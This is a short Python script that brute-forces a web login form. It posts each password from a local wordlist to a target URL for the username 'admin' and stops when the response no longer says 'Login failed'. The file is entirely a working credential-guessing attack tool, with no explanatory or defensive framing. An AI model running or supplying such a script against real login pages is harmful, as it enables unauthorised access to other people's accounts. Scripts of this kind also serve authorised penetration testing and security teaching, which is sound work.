#!/usr/bin/env python

import requests

target_url= 'https://www.google.com'
data_d = {"username":"admin","password":"","Login":"submit"}

with open("/root/Downloads/passwords.list","r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_d["password"] = word
        response = requests.post(target_url,data_d)
        if b"Login failed" not in response.content:
            print("[+] Got the password " +word)
            exit()

print("[-] Couldn't get the password ")